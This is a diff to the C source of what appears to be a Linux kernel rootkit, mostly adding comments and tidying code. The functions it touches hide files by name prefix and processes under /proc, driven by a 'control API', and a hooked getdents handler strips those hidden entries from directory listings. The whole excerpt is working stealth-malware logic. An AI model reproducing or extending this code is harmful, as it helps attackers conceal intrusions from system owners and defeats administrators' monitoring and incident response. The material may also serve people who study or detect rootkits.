@@ -40,7 +40,7 @@ get_next_level (char *path)
 		return NULL;
 	}
 	
-	/* get the next occurence of '/' */
+	/* get the next occurrence of '/' */
 	ptr = strchr(path, delimiter);
 	
 	/* safety check */
@@ -68,10 +68,12 @@ get_next_level (char *path)
 int
 check_hide_fpath(char *path)
 {
+	/* safety check */
 	if(path == NULL) {
 		return 0;
 	}
 	
+	/* check with the control API if we need to hide it */
 	return is_path_hidden(path);
 }
 
@@ -87,6 +89,7 @@ check_hide_fprefix(char *path)
 	struct file_prefix *cur;
 	struct list_head *cursor;
 	
+	/* safety check */
 	if(path == NULL) {
 		return 0;
 	}
@@ -95,24 +98,22 @@ check_hide_fprefix(char *path)
 	
 	do {
 		
+		/* check each hidden prefix of the control API */
 		list_for_each(cursor, get_prefix_list()) {
 			cur = list_entry(cursor, struct file_prefix, list);
 			
-			if(strstr(d_name, cur->name) == d_name) 
-			{
+			/* on match hide the file/folder */
+			if(strstr(d_name, cur->name) == d_name) {
 				return 1;
 			}
 		}
 		
-		//if(strstr(d_name, "rootkit_") == d_name) {
-		//	return 1;
-		//} else if(strstr(d_name, ".rootkit_") == d_name) {
-		//	return 1;
-		//}
-		
+		/* prepare for the next iteration */
 		d_name = get_next_level(d_name);
+		
 	} while (d_name != NULL);
 	
+	/* do not hide it */
 	return 0;
 }
 
@@ -142,7 +143,7 @@ check_hide_process(int fd, char *d_name)
 	
 	/* check if we are in the /proc directory */
 	if(strcmp(dir, "/proc") == 0) {
-		/* check if we need to hide this process */
+		/* check the control API if we need to hide this process */
 		return is_process_hidden(convert_atoi(d_name));
 	}
 
@@ -235,9 +236,11 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 		/* check whether we need to hide the file */
 		if(check_hide_process(fd, dirp->d_name)
 				|| check_hide_loop(path)) {
+			
 			/* remove it from the output */
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
+			
 		} else if(tlen != 0) {
 			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
 		}
@@ -246,7 +249,6 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 	
 	/* lock and decrease the call counter */
 	DECREASE_CALL_COUNTER(getdents_call_counter, &getdents_lock, getdents_lock_flags);
-
 	return ret;
 }
 
